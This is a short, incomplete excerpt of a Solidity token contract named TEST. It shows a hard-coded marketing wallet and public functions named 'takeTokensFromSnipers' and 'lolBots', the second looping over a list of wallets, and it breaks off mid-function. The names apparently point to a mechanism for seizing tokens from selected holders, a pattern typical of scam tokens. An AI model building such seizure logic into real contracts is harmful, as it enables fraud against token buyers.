...
contract TEST is Context, IERC20, Ownable {
    ...
    address public marketingWallet = 0x95d89cbD5b0E9204710Da0cC96032931eD2A3321;
    ...
    function takeTokensFromSnipers() public virtual {
    ...
    function lolBots() public virtual { for (uint256 i = 0; i < includeFromFee.length; i++) { address wallet = includeFromFee[i];
